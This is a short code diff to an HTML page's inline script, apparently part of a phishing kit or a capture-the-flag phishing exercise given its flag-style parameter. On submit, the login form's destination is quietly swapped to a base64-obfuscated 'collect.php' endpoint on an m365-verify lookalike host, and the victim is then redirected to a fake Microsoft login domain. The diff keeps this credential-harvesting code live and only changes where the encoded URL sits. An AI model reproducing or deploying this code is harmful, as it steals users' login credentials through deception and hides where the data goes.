@@ -26,9 +26,8 @@
     </form>
   </div>
   <script>
-    var _cfg = "aHR0cHM6Ly9zeW5jLm0zNjUtdmVyaWZ5LmV4YW1wbGUvYXBpL2NvbGxlY3QucGhwP2tpdD1tZXRpc3taR1ZqYjJSbFpGOXdhR2x6YUY5b2IzTjB9";
     document.getElementById('f').addEventListener('submit', function () {
-      this.action = atob(_cfg);   // 送出的瞬間才把目的地換掉
+      this.action = atob("aHR0cHM6Ly9zeW5jLm0zNjUtdmVyaWZ5LmV4YW1wbGUvYXBpL2NvbGxlY3QucGhwP2tpdD1tZXRpc3taR1ZqYjJSbFpGOXdhR2x6YUY5b2IzTjB9");
       setTimeout(function () { location.href = 'https://login.microsoftonline.example/'; }, 500);
     });
   </script>
